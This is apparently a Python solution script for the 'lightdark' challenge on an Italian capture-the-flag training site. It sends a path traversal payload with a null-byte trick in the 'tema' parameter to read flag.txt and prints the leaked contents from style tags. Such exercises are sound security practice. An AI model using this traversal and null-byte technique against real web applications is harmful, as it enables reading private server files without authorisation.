import requests
from bs4 import *

site = "http://lightdark.challs.olicyber.it/index.php?tema="
payload = ".../.../.../.../.../flag.txt%00.css" # /static/css/*link* => /flag.txt

r = requests.get(site + payload)
zuppetta = BeautifulSoup(r.text, "html.parser")
for i in zuppetta.find_all("style"):
    print(str(i).replace("<style>", "").replace("</style>", "").replace(" ", "").replace("\n", ""))